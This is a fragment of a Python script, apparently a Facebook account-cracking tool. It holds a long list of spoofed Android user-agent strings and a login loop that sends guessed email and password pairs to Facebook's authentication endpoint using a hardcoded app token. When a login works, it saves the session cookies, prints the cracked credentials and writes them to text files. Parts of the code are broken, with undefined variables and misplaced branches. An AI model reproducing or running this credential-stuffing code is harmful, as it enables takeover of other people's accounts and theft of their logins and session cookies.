Build/RONS31.267-94-3)","Dalvik/2.1.0 (Linux; U; Android 6.0; Note20+ Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230505.002.G1)","Dalvik/2.1.0 (Linux; U; Android 9; Lenovo TB-8504F Build/PQ3A.190801.002)","Dalvik/2.1.0 (Linux; U; Android 11; ASUS_I005D Build/RKQ1.210303.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2038 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; LG-H870 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 11; Optima 7 A102 3G TS7243PG Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; BL150 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 11; A8P Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N) C4oD_Android/9.6.1 (uid:c74a09cf-2e2f-4494-a948-5f5a01fcd349; tid:-; did:Amazon_KFTRWI_28;)","Dalvik/2.1.0 (Linux; U; Android 9; KFONWI Build/PS7327.3326N) C4oD_Android/9.6.0 (uid:be27f2fd-13ef-4eb9-8fcd-a2b48e2a17e9; tid:-; did:Amazon_KFONWI_28;)","Dalvik/2.1.0 (Linux; U; Android 13; V2072A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SC-52A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; KFONWI Build/PS7327.3326N) C4oD_Android/9.6.0 (uid:aa16de38-3bc3-4ff0-b52b-803a42312cfb; tid:-; did:Amazon_KFONWI_28;)","Dalvik/2.1.0 (Linux; U; Android 12; AGS5-W09 Build/HUAWEIAGS5-W09)","Dalvik/2.1.0 (Linux; U; Android 12; moto g200 5G Build/S1RXS32.50-13-17)","Dalvik/2.1.0 (Linux; U; Android 11; PEGM10 Build/RKQ1.201217.002)","Dalvik/2.1.0 (Linux; U; Android 12; 2201117TG Build/SKQ1.211103.001) VD/235","Dalvik/2.1.0 (Linux; U; Android 7.0; Archos 101b Xenon Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; SL104D Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11.0; i13 pro Max Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; moto g52 Build/S1SRS32.38-132-11)","Dalvik/2.1.0 (Linux; U; Android 11; Lenovo TB-Q706F Build/RKQ1.210614.002)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) Build/S1RFS32.27-25-12)","Dalvik/2.1.0 (Linux; U; Android 9; POS-EIBTPDC Build/PI)","Dalvik/2.1.0 (Linux; U; Android 12; SM-E045F Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; Z42 pro Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; MX-A10R Build/S00812)","Dalvik/2.1.0 (Linux; U; Android 11; mt5867 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; PCHM10 Build/RKQ1.200903.002)","Dalvik/2.1.0 (Linux; U; Android 11; R4 Build/RTK2.220814.001)","Dalvik/2.1.0 (Linux; U; Android 11; SmartTV Build/RTM4.220307.159)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042.A1)","Dalvik/2.1.0 (Linux; U; Android 12; A161 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; MAXIMUS 5.0 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; Android 7.1.2; MI 8 SE Build/311vx; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 9; SHV46 Build/PKQ1.190626.001)","Dalvik/2.1.0 (Linux; U; Android 13; NX712J Build/TKQ1.221220.001)","Dalvik/2.1.0 (Linux; U; Android 11; T766H_EEA Build/RP1A.200720.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; 5002E Build/QKQ1.200623.002) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 9; ZTE Blade A3 2020 Build/PPR1.180610.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A145M Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; T5 Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 10; M2003J15SC MIUI/V12.0.10.0.QJOEUXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; Studio Mini 2023 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RH32.20-42-13-2-3)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Viva_1003G_Lite Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 fusion Build/S3SJS32.1-86-2-4)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N971N Build/LMY48Z)","Dalvik/2.1.0 (Linux; U; Android 11; Facilotab L Rubis Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.025)","Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone64_x86_64 Build/TSE5.230214.001)","Dalvik/2.1.0 (Linux; U; Android 11; M40Pro_RUS Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; NLG-QBEX Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Aquaris X5 Plus Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; KFRAWI Build/RS8318.2031N)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-7-11)","Dalvik/2.1.0 (Linux; U; Android 12; V Max Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A505FN Build/RP1A.200720.012) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; S88Pro Build/QP1A.190711.020) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; M2004J19C MIUI/V12.0.4.0.QJCMIXM) VD/235","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TQ2B.230505.005.A1) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; PLUM Z712 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-5-1-5)","Dalvik/2.1.0 (Linux; U; Android 12; RMX2111 Build/SP1A.210812.016) baiduboxapp/13.33.0.11 (Baidu; P1 12) SP-engine/2.71.0 baiduboxapp/13.33.0.11 (Baidu; P1 12) dumedia/7.41.52.13","Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30i 5G Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 12; I1927 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 12; Tab 12 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g42 Build/S2SE32.28-13-1)","Dalvik/2.1.0 (Linux; U; Android 12; Nokia G11 Build/SP1A.210812.016; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 13; I2203 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 6.0; V730 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; Redmi Note 5 Pro Build/SQ3A.220705.003)",])'
            ua_string= f'Dalvik/2.1.0 (Linux; U; Android 10; Nokia 1.3 Build/QKQ1.191008.001) [FBAN/FBIOS;FBDV/Nokia6600;FBMD/Nokia;FBSN/IOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]','Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]','Dalvik/2.1.0 (Linux; U; Android 10; Nokia 1.3 Build/QKQ1.191008.001) [FBAN/FBIOS;FBDV/Nokia6600;FBMD/Nokia;FBSN/IOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]','FBAN/FB4A;FBAV/236.0.0.42.195;FBBV/38330549;FBDM/{density=5.8,width=875,height=1158};FBLC/en_GB;FBRV/48809099;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G981N;FBSV/8.5;FBOP/1;FBCA/arm64-v8a'
            adid = str(uuid.uuid4())
            ua_string = uaa()
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_ua',
                    'client_country_code': 'ua',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent': uaa(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                kuki = po["session_cookies"]
                cok = {}
                for x in kuki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r  \033[1;91m[\033[1;92mRNC\033[1;91m-\033[1;92mROCKY-OKS '+ids+'\033[1;91m-\033[1;92m'+pas+'\033[1;92m')
                oks.append(ids)
                open('/sdcard/ROCKY-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
                elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[EHC-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('EHC-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
Meta()
